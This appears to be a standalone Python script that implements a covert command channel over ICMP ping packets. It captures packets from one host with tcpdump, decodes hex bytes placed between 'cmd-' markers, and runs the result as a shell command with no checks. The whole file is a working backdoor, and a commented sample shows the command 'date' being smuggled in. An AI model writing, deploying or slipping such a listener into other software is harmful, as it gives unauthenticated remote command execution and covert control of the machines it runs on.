import re
import subprocess as sp

while 1: 
    # Run tcpdump and capture its output for the first packet
    command = ["sudo", "tcpdump", "-x", "host", "172.31.42.208", "-i", "eth0", "-c", "1"]
    text = sp.check_output(command, text=True, stderr=sp.STDOUT)

    # text = """
    # dropped privs to tcpdump
    # tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    # listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
    # 17:42:16.358997 IP ip-172-31-42-208.ap-south-1.compute.internal > ip-172-31-33-135.ap-south-1.compute.internal: ICMP echo request, id 33, seq 1, length 64
    #         0x0000:  4500 0054 7504 4000 4001 210f ac1f 2ad0
    #         0x0010:  ac1f 2187 0800 1e24 0021 0001 78f3 e464
    #         0x0020:  0000 0000 5579 0500 0000 0000 636d 642d
    #         0x0030:  6461 7465 636d 642d 6461 7465 636d 642d
    #         0x0040:  6461 7465 636d 642d 6461 7465 636d 642d
    #         0x0050:  6461 7465
    # 1 packet captured
    # 4 packets received by filter
    # 0 packets dropped by kernel
    # """

    if "ICMP echo request" in text:
        print("Ok! Got a valid packet")
        
        lines = text.split('\n')
        found_lines = ""

        for line in lines:
            if '0x0' in line:
                found_lines+=(line.strip().split(': ')[1].strip().replace(' ', ''))
        print(found_lines)
        
    pattern = r'636d642d(.*?)636d642d'

    cleaned_text = found_lines

    matches = re.findall(pattern, cleaned_text, re.DOTALL)

    command = matches[0].strip()
    command_text = bytes.fromhex(command).decode('utf-8')

    print(f"The command packet after clearing the hexdump is: {command}")
    print("\n\n")
    print(f"The command found is: {command_text}")
    print("\nExecuting the command...\n")

    cmd_op = sp.getoutput(command_text)
    print(f"The output of the command is: {cmd_op}")